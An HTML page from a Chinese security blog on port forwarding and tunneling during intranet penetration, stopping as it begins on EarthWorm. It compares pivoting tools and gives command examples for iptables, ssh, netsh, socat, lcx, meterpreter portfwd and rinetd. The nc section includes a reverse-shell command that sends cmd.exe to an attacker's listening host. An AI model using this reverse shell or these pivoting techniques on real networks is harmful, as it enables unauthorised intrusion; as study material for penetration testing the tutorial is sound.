@@ -1,0 +1,1486 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="绕过,渗透,内网,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Blog of 1ypt0" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/lypto.ico?v=5.1.1">
+
+
+
+
+
+
+<meta name="description" content="需要知道，在渗透的整个流程中，根据web应用或者开放的端口进行渗透，获取webshell只是渗透这门艺术的一小部分，在真实的错综复杂的企业环境中进行内网渗透，其实水很深，涉及内网穿透，端口转发，域渗透，提权等一系列的难题。所以这篇文章对内网渗透学习进行一些记录。在这过程中参考了很多前辈们的宝贵经验，我把这些链接进行了收集，放在参考文献部分。">
+<meta name="keywords" content="绕过,渗透,内网">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透中的端口转发">
+<meta property="og:url" content="http://lypto.me/2018/12/22/内网渗透中的端口转发/index.html">
+<meta property="og:site_name" content="Blog of 1ypt0">
+<meta property="og:description" content="需要知道，在渗透的整个流程中，根据web应用或者开放的端口进行渗透，获取webshell只是渗透这门艺术的一小部分，在真实的错综复杂的企业环境中进行内网渗透，其实水很深，涉及内网穿透，端口转发，域渗透，提权等一系列的难题。所以这篇文章对内网渗透学习进行一些记录。在这过程中参考了很多前辈们的宝贵经验，我把这些链接进行了收集，放在参考文献部分。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-12-22T09:31:37.635Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内网渗透中的端口转发">
+<meta name="twitter:description" content="需要知道，在渗透的整个流程中，根据web应用或者开放的端口进行渗透，获取webshell只是渗透这门艺术的一小部分，在真实的错综复杂的企业环境中进行内网渗透，其实水很深，涉及内网穿透，端口转发，域渗透，提权等一系列的难题。所以这篇文章对内网渗透学习进行一些记录。在这过程中参考了很多前辈们的宝贵经验，我把这些链接进行了收集，放在参考文献部分。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":0,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://lypto.me/2018/12/22/内网渗透中的端口转发/">
+
+
+
+
+
+  <title>内网渗透中的端口转发 | Blog of 1ypt0</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?47d7b880e7f466d86f6a2755e80a6337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+	<a href="https://github.com/IversionBY"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Blog of 1ypt0</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://lypto.me/2018/12/22/内网渗透中的端口转发/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="1ypt0">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/109.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of 1ypt0">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">内网渗透中的端口转发</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-22T17:30:26+08:00">
+                Dec 22 2018
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/12/22/内网渗透中的端口转发/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/12/22/内网渗透中的端口转发/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  3.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  15
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>需要知道，在渗透的整个流程中，根据web应用或者开放的端口进行渗透，获取webshell只是渗透这门艺术的一小部分，在真实的错综复杂的企业环境中进行内网渗透，其实水很深，涉及内网穿透，端口转发，域渗透，提权等一系列的难题。所以这篇文章对内网渗透学习进行一些记录。在这过程中参考了很多前辈们的宝贵经验，我把这些链接进行了收集，放在参考文献部分。</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="转发，映射，代理"><a href="#转发，映射，代理" class="headerlink" title="转发，映射，代理"></a>转发，映射，代理</h1><p>这几个概念其实是比较难区分的，特别是和后面的内网穿透混在一起，在宏观上说，他们差别不大。但是究其本质还是存在不小的差别的。现在就先对这几个概念说一下我个人的理解：</p>
+<ul>
+<li>转发： 转发是渗透中一种手段，是将一个网络端口从一个网络节点转发到另一个节点的行为。结果是使一个外网用户经过一个NAT路由器到达在内网IP地址某个端口。有时候也被称为隧道。</li>
+<li>映射： 映射也是渗透中的一种手段，端口映射就是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。其实很多时候转发和映射</li>
+<li>代理： 代理是一种结果，以端口转发和映射为技术基础。代理在很多场合是用在连接互联网的web服务上面，起到突破ip封锁，隐匿身份等作用。其原理是动态的端口转发。只需要本机和代理间建立一个隧道，然后代理就可以根据本机发起的请求去动态的获取出链的地址与端口。</li>
+<li>内网穿透： 内网穿透是目的，它使用的手段有包括端口转发和映射，或者直接使用代理这一结果。很多时候我们指的内网穿透场景是指攻击机与靶机处于处于不同的内网中，一些回弹shell之类的手段直接实现，因为IP地址无法相互建立连接。这个时候就需要使用一些内网穿透常见的工具。这些工具也是使用端口转发和映射或类似的方法来突破限制。</li>
+</ul>
+<table>
+  <thead>
+    <tr>
+      <th>工具名称</th>
+      <th>主要用途</th>
+      <th>平台</th>
+      <th>备注</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>lcx</td>
+      <td>端口映射</td>
+      <td>Windows</td>
+      <td>只支持tcp协议的端口转发，非系统内置。linux下叫做可以实现端口转发和端口映射</td>
+    </tr>
+    <tr>
+      <td>netsh</td>
+      <td>端口映射</td>
+      <td>Windows</td>
+      <td>只支持tcp协议的端口转发，需要安装ipv6</td>
+    </tr>
+    <tr>
+      <td>rinetd</td>
+      <td>反向代理</td>
+      <td>Linux</td>
+      <td>非内置，需要自行安装</td>
+    </tr>
+    <tr>
+      <td>Earthworm</td>
+      <td>端口映射、Socks5代理</td>
+      <td>Linux、Windows、MacOS、Arm-Linux</td>
+      <td>非系统内置，可以十分方便的支持多级转发</td>
+    </tr>
+    <tr>
+      <td>frp</td>
+      <td>高性能的反向代理应用</td>
+      <td>go</td>
+      <td>基于反向代理，可以十分灵活的进行内网穿透，绕过防火墙</td>
+    </tr>
+    <tr>
+      <td>reGeorg</td>
+      <td>Socks5 代理</td>
+      <td>常见脚本语言</td>
+      <td>reGeorg利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php、jsp、js等web语言</td>
+    </tr>
+    <tr>
+      <td>Metasploit portfwd</td>
+      <td>端口映射</td>
+      <td>MSF -&gt; Metpreter会话</td>
+      <td>需要网络状况较好</td>
+    </tr>
+    <tr>
+      <td>socat</td>
+      <td>端口映射</td>
+      <td>Linux</td>
+      <td>可能需要安装</td>
+    </tr>
+    <tr>
+      <td>Metasploit-&gt;socks4a</td>
+      <td>反向代理</td>
+      <td>MSF -&gt; Metpreter会话</td>
+      <td>需要会话主机有外网代理IP</td>
+    </tr>
+    <tr>
+      <td>tunna</td>
+      <td>HTTP隧道</td>
+      <td>常见脚本语言</td>
+      <td>需脚本环境执行，并且不太稳定</td>
+    </tr>
+    <tr>
+      <td>localtuuel</td>
+      <td>内网公网映射</td>
+      <td>nodojs</td>
+      <td>和ngork一样可以实现内网到公网端口的映射</td>
+    </tr>
+    <tr>
+      <td>ngork</td>
+      <td>内网公网映射</td>
+      <td>go</td>
+      <td>可以选择自建服务器或则和使用工具自带的服务器</td>
+    </tr>
+    <tr>
+      <td>dns2tcp</td>
+      <td>DNS隧道</td>
+      <td>kaii内置</td>
+      <td>防火墙过滤内部tcp出站策略的情况下，走DNS隧道，，通过DNS流量中继TCP连接</td>
+    </tr>
+    <tr>
+      <td>Iodine</td>
+      <td>DNS隧道</td>
+      <td>linux</td>
+      <td>原理上和dns2tcp类似</td>
+    </tr>
+    <tr>
+      <td>icmpsh</td>
+      <td>ICMP隧道</td>
+      <td>需要root权限</td>
+      <td>需要禁止系统对icmp的相应，用工具来处理收发icmp包</td>
+    </tr>
+
+  </tbody>
+</table>
+
+<h1 id="系统内置的转发工具"><a href="#系统内置的转发工具" class="headerlink" title="系统内置的转发工具"></a>系统内置的转发工具</h1><h2 id="iptables-NAT功能"><a href="#iptables-NAT功能" class="headerlink" title="iptables NAT功能"></a>iptables NAT功能</h2><p>由于linux主机出于安全考虑，系统参数<code>/proc/sys/net/ipv4/ip_forward</code>默认为0，所以是禁止NAT功能的，我们可以通过以下两种你方式修改系统运行时的参数。</p>
+<h3 id="临时方案"><a href="#临时方案" class="headerlink" title="临时方案"></a>临时方案</h3><p><code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code></p>
+<h3 id="长期方案"><a href="#长期方案" class="headerlink" title="长期方案"></a>长期方案</h3><p>运行<code>vi /etc/sysctl.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 找到下面的值并将0改成1</span><br><span class="line"></span><br><span class="line">net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure></p>
+<p>运行<code>sysctl –p</code>，使改动立即生效 。</p>
+<p>下面是一个转发的示例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 1.1.1.1是公网ip,192.168.2.2内网ip</span><br><span class="line">iptables -t nat -A PREROUTING  -p tcp -d 1.1.1.1 --dport 80 -j DNAT --to-destination 192.168.2.2:8080</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -s 192.168.2.2 --sport 8080 -j SNAT --to-source 1.1.1.1</span><br><span class="line"></span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure></p>
+<p>这样就会使得访问1.1.1.1：80 映射到了192.168.2.2：8080端口。注意到这里</p>
+<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 公网主机</span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line"># 内网机器</span><br><span class="line">nc -t -e cmd.exe 公网主机ip 4444</span><br></pre></td></tr></table></figure>
+<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#本地端口转发:</span><br><span class="line">ssh -CfNg -L port1:127.0.0.1:port2 user@host </span><br><span class="line">参数： -L 本地网卡地址:本地端口:目标地址:目标端口</span><br><span class="line"></span><br><span class="line">#远程端口转发： </span><br><span class="line">ssh -CfNg -R port2:127.0.0.1:port1 user@hsst</span><br><span class="line">参数： -R 远程网卡地址:远程端口:目标地址:目标端口</span><br><span class="line"></span><br><span class="line">#动态端口转发</span><br><span class="line">ssh -D localhost:2000 root@103.59.22.17</span><br><span class="line">参数：-D 本地网卡地址:本地端口</span><br></pre></td></tr></table></figure>
+<h2 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h2><p>netsh是windows下提供网络管理的命令行工具，它是一个交互式的shell,涉及到上下文的概念。我们在交互式下面进入相应的上下文，进行参数的设置。也可以直接下面这样非交互式的进行端口转发。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netsh  interface ipv6 install</span><br><span class="line">#转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=10.10.18.1 listenport=4455 connectaddress=10.10.12.1  connectport=8080</span><br><span class="line"></span><br><span class="line">#删除转发</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=&#123;B的IP&#125;  listenport=&#123;B的端口&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="非内置的端口转发工具"><a href="#非内置的端口转发工具" class="headerlink" title="非内置的端口转发工具"></a>非内置的端口转发工具</h1><h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><p>socat这个端口转发我们其实更常用在ssrf构造payload的时候本地抓包，因为socat有记录转发流的功能。将socat作为中介捕获我们构造的payload包，然后进行进一步的操作，如gopher协议的构造。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">yum install -y socat</span><br><span class="line">apt install -y socat </span><br><span class="line"></span><br><span class="line">#TCP </span><br><span class="line">nohup socat TCP4-LISTEN:10000,reuseaddr,fork TCP4:1.1.1.1:10000</span><br><span class="line"></span><br><span class="line">TCP4-LISTEN:10000  监听 ipv4 的 10000TCP 端口。 10000 改成你自己需要转发的端口</span><br><span class="line">fork TCP4:1.1.1.1:10000  转发到 1.1.1.1 的 10000 端口，根据需求修改自行修改 ip 和端口</span><br><span class="line">nohup 后台运行。可以把这个命令写到   /etc/rc.local 里面开机启动启动。</span><br><span class="line"></span><br><span class="line">#UDP</span><br><span class="line">nohup socat -T 600 UDP4-LISTEN:10000,reuseaddr,fork UDP4:1.1.1.1:10000</span><br></pre></td></tr></table></figure></p>
+<h2 id="lcx-exe"><a href="#lcx-exe" class="headerlink" title="lcx.exe"></a>lcx.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">lcx-&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span><br><span class="line">[option:]</span><br><span class="line"></span><br><span class="line"> -listen &lt;监听端口&gt; &lt;转发端口&gt; </span><br><span class="line"></span><br><span class="line"> -tran&lt;监听端口&gt; &lt;目标地址&gt; &lt;目标端口&gt;</span><br><span class="line"></span><br><span class="line"> -slave &lt;目标主机&gt; &lt;目标端口&gt; &lt;本地主机&gt;&lt;本机端口&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">内网机器上执行：</span><br><span class="line">lcx.exe –slave 公网IP +端口 内网IP +端口</span><br><span class="line">例: </span><br><span class="line">lcx.exe –slave 192.168.43.142 51 192.168.43.137 3389</span><br><span class="line">公网上执行：</span><br><span class="line">Lcx.exe –listen 监听51端口，转发到公网机器的3389端口</span><br><span class="line">例: </span><br><span class="line">Lcx.exe –listen 51 3389</span><br></pre></td></tr></table></figure>
+<h2 id="meterpreter-portfwd"><a href="#meterpreter-portfwd" class="headerlink" title="meterpreter portfwd"></a>meterpreter portfwd</h2><p>在MSF渗透框架里面内置了端口转发的命令，在回弹了shell的条件下可以直接使用，下面式相关参数解析。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -L &lt;opt&gt;  转发: 本地监听地址  反向: 本地主机连接到某个地址</span><br><span class="line">    -R        表示正向反向端口</span><br><span class="line">    -h        帮助信息</span><br><span class="line">    -i &lt;opt&gt;  端口转发条目的索引与交互（请参阅“列表”命令）</span><br><span class="line">    -l &lt;opt&gt;  转发：本地端口收听  反向：本地端口连接</span><br><span class="line">    -p &lt;opt&gt;  转发：远程端口连接  反向：远程端口监听</span><br><span class="line">    -r &lt;opt&gt;  转发：连接到远程主机</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">例子:</span><br><span class="line">portfwd -L 127.0.0.1 -l 1212 -r 10.10.12.1 -p 3389  </span><br><span class="line"></span><br><span class="line">portfwd -R -L 10.10.18.1 -l 8080 -r 10.10.12.1 -p 8877</span><br></pre></td></tr></table></figure>
+<h2 id="Rinetd"><a href="#Rinetd" class="headerlink" title="Rinetd"></a>Rinetd</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装，注意到centos没有其默认的软件源，需要手动导入；ubuntu的比较方便</span></span><br><span class="line"><span class="comment">#centos 32</span></span><br><span class="line">$ vim /etc/yum.repos.d/nux-misc.repo</span><br><span class="line">[nux-misc]</span><br><span class="line">name=Nux Misc</span><br><span class="line">baseurl=http://li.nux.ro/download/nux/misc/el6/i386/</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro</span><br><span class="line"></span><br><span class="line"><span class="comment">#centos 64</span></span><br><span class="line">$ vim  /etc/yum.repos.d/nux-misc.repo:</span><br><span class="line"></span><br><span class="line">[nux-misc]</span><br><span class="line">name=Nux Misc</span><br><span class="line">baseurl=http://li.nux.ro/download/nux/misc/el6/x86_64/</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro</span><br><span class="line"></span><br><span class="line">$ yum --enablerepo=nux-misc install rinetd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ubuntu</span></span><br><span class="line">$ apt-get install rinetd</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置文件在/etc/rinetd.conf，配置参数格式</span></span><br><span class="line">[bindaddress] [bindport] [connectaddress] [connectport]</span><br><span class="line">绑定的地址    绑定的端口  连接的地址      连接的端口</span><br><span class="line"></span><br><span class="line">[Source Address] [Source Port] [Destination Address] [Destination Port]</span><br><span class="line">源地址            源端口         目的地址               目的端口</span><br><span class="line"></span><br><span class="line"><span class="comment">#举例</span></span><br><span class="line">$ vim /etc/rinetd.conf</span><br><span class="line"></span><br><span class="line">0.0.0.0 8080 172.19.94.3 8080</span><br><span class="line">0.0.0.0 2222 192.168.0.103 3389</span><br><span class="line">1.2.3.4 80 192.168.0.10 80</span><br><span class="line">allow *.*.*.*</span><br><span class="line">logfile /var/<span class="built_in">log</span>/rinetd.log</span><br><span class="line"></span><br><span class="line"><span class="comment">#解释</span></span><br><span class="line">0.0.0.0表示本机绑定所有可用地址</span><br><span class="line">将所有发往本机8080端口的请求转发到172.19.94.3的8080端口</span><br><span class="line">将所有发往本机2222端口的请求转发到192.168.0.103的3389端口</span><br><span class="line">将所有发往1.2.3.4的80端口请求转发到192.168.0.10的80端口</span><br><span class="line">allow设置允许访问的ip地址信息,*.*.*.*表示所有IP地址</span><br><span class="line">logfil设置打印的<span class="built_in">log</span>的位置</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line"><span class="comment">#脚本启动</span></span><br><span class="line">$ /etc/init.d/rinetd start</span><br><span class="line"></span><br><span class="line"><span class="comment">#二进制启动</span></span><br><span class="line">$ /usr/sbin/rinetd -c /etc/rinetd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭（使用脚本，或则和pkill）</span></span><br><span class="line">$ /etc/init.d/rinetd stop</span><br></pre></td></tr></table></figure>
+<h2 id="Tunna-与-reGeorg"><a href="#Tunna-与-reGeorg" class="headerlink" title="Tunna 与 reGeorg"></a>Tunna 与 reGeorg</h2><blockquote>
+<p>这两个工具的使用都是比较简单，就不啰嗦了，在获取webshell后，我们可以通过http进行端口转发。直接给出两个项目地址，推荐使用reGeorg，Tunna不稳定。<a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">Tunna工具地址</a><br>  <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg工具地址</a>。</p>
+</blockquote>
+<h3 id="Localtunnel与Gnork"><a href="#Localtunnel与Gnork" class="headerlink" title="Localtunnel与Gnork"></a>Localtunnel与Gnork</h3><p>这两个工具都可以将内网的端口映射到公网，然后访问公网的ip就类似于访问内网的端口。这两个工具可以提供自建服务或者使用它提供的服务器进行内网穿透。其实这类工具在实际渗透中不是很常用。更直接的场景是自己攻击机在内网，在进行相关回连操作的时候，需要目标机器可达，毕竟它们只是一级转发，而且操作麻烦。直接给出项目地址：</p>
+<ul>
+<li><a href="https://github.com/localtunnel/localtunnel" target="_blank" rel="noopener">https://github.com/localtunnel/localtunnel</a></li>
+<li><a href="https://ngrok.com/" target="_blank" rel="noopener">https://ngrok.com/</a></li>
+</ul>
+<h3 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h3><blockquote>
+<p>工具的地址： <a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a>    </p>
+</blockquote>
+<p>这是个国产的打洞神器，因为其方便的多级转发，支持反向代理等特性，在内网渗透领域可是响当当的。这里重点对这个工具做下记录，真的太强大了！</p>
+<p>该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）。下面针对官方的例子进行以下解释：</p>
